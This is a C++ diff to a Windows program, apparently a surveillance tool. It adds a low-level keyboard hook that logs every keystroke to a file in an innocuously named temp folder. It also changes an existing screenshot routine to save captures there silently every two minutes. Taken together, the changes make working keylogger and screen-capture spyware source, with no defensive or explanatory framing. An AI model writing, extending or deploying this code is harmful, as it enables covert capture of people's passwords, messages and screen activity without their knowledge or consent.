@@ -1,5 +1,8 @@
 #include <windows.h>
 
+LPSTR TEMP = new CHAR[MAX_PATH];
+LPSTR LOGFILE = new CHAR[MAX_PATH];
+LPSTR SSSFOLDER = new CHAR[MAX_PATH];
 
 PBITMAPINFO
 createBitmapInfoStruct(HBITMAP bitmapHandler) {
@@ -61,9 +64,11 @@ savebitmap(HDC hDC, HBITMAP bitmap) {
   LPSTR filename = new CHAR[30];
   SYSTEMTIME st;
   GetLocalTime(&st);
-  GetTimeFormatA(LOCALE_SYSTEM_DEFAULT, TIME_FORCE24HOURFORMAT, &st, "'screenshot_'HH'_'mm'_'ss'.bmp'", filename, 30);
+  GetTimeFormatA(LOCALE_SYSTEM_DEFAULT, TIME_FORCE24HOURFORMAT, &st, "'sss'HHmmss'.bmp'", filename, 30);
+  LPSTR filepath = new CHAR[MAX_PATH];
+  wsprintf(filepath, "%s\\%s", SSSFOLDER, filename);
   hf = CreateFile(
-      filename,
+      filepath,
       GENERIC_READ | GENERIC_WRITE,
       (DWORD) 0,
       NULL,
@@ -72,6 +77,7 @@ savebitmap(HDC hDC, HBITMAP bitmap) {
       (HANDLE) NULL
   );
   delete filename;
+  delete filepath;
 
   fileHeader.bfType = 0x4d42;
   fileHeader.bfSize = (DWORD) (
@@ -120,6 +126,37 @@ screenshot(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
   DeleteObject(hBitmap);
 }
 
+void
+logkey(DWORD key) {
+  static HANDLE hf = CreateFile(LOGFILE, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+  DWORD dwTmp;
+
+  LPSTR data = new char[5];
+  wsprintf(data, "[%02X]", key);
+  WriteFile(hf, data, 4, &dwTmp, NULL);
+}
+
+LRESULT CALLBACK
+Keylogger(int nCode, WPARAM wParam, LPARAM lParam) {
+  if (nCode != HC_ACTION)
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+  if (wParam != WM_KEYDOWN && wParam != WM_SYSKEYDOWN)
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+
+  PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;
+  logkey(p->vkCode);
+  return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+void
+setup() {
+  GetTempPath(MAX_PATH, TEMP);
+  wsprintf(SSSFOLDER, "%s\\%s", TEMP, "sss_sss_sss_sss");
+  wsprintf(LOGFILE, "%s\\%s", SSSFOLDER, "sss.txt");
+  CreateDirectory(SSSFOLDER, NULL);
+  HANDLE hf = CreateFile(LOGFILE, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+  CloseHandle(hf);
+}
 
 int WINAPI
 wWinMain(
@@ -129,19 +166,21 @@ wWinMain(
     int nCmdShow
 ) {
 
-  HWND hwnd = 0;
-  MSG msg;
+  setup();
 
   UINT min = 60 * 1000;
+  UINT_PTR timer = SetTimer(NULL, 0, 2 * min, (TIMERPROC) screenshot);	// setup a 2 min loop
+  HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, Keylogger, 0, 0);
 
-  UINT_PTR timer = SetTimer(hwnd, 0, 0, (TIMERPROC) screenshot);
+  PostMessage(NULL, WM_TIMER, 0, 2 * min);		// take screenshot on start
 
+  MSG msg;
   while (GetMessage(&msg, NULL, 0, 0)) {
     TranslateMessage(&msg);
     DispatchMessage(&msg);
 
-    if (msg.message == WM_TIMER)
-      timer = SetTimer(hwnd, 0, 2 * min, (TIMERPROC) screenshot);
+	if (msg.message == WM_TIMER)
+	  screenshot(NULL, WM_TIMER, 0, 2 * min);	// first screenshot
   }
 
   return 0;
